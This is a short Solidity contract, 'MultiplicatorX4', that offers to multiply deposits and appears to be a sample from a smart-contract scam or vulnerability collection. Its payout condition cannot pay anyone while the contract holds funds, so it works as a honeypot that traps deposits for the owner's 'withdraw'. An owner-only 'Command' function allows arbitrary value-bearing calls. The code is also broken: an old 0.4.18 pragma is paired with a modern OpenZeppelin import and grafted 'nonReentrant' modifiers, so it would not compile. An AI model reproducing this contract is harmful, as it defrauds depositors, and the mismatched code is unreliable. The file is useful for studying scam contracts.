// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract MultiplicatorX4
 is ReentrancyGuard {
    address public Owner = msg.sender;

    function() public payable{}

    function withdraw()
    payable
    public
    nonReentrant {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes data)
    payable
    public
    nonReentrant {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    nonReentrant {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}